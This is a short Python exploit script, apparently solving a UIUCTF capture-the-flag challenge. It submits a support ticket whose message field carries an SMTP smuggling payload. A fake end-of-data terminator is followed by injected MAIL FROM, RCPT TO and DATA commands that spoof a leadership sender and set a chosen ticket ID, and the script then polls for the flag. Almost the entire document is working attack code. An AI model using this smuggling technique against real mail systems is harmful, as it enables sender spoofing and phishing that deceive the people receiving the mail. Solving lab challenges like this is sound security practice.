import requests
import time
import re

BASE_URL = "https://inst-c34dd53b49a9c5fd-supermassive-black-hole.chal.uiuc.tf/"

session = requests.Session()

# Smuggling payload — NO \r\n.\r\n at all i/son body
# Overwrite FROM and X-Ticket-ID
payload = (
    "Hello support,\n"
    "\n.\r\n"  # Fake terminator (LF . CRLF) triggers smuggling
    "MAIL FROM:<leadership@blackholeticketing.com>\r\n"
    "RCPT TO:<it@blackholeticketing.com>\r\n"
    "DATA\r\n"
    "From: leadership@blackholeticketing.com\r\n"
    "To: it@blackholeticketing.com\r\n"
    "X-Ticket-ID: smuggled_leadership\r\n"
    "Subject: SMUGGLED\r\n"
    "\r\n"
    "This should trigger the flag.\r\n"
    "\n.\n"  # Real terminator, but avoids \r\n.\r\n!
)

print("[*] Submitting smuggled ticket...")
r = session.post(
    f"{BASE_URL}/submit_ticket",
    data={
        "subject": "Ignore this subject",
        "message": payload
    },
)

print(f"Response status: {r.status_code}")
print(f"Response: {r.text}")

print("\n[*] Checking smuggled ticket ID directly...")
resp = session.get(f"{BASE_URL}/check_response/smuggled_leadership")
if resp.status_code == 200:
    data = resp.json()
    print(f"Smuggled ticket data: {data}")
    if "response" in data and ("uiuctf{" in data["response"] or "C-Suite" in data["response"]):
        print("[!] FLAG FOUND IN SMUGGLED TICKET!")
        print(data["response"])
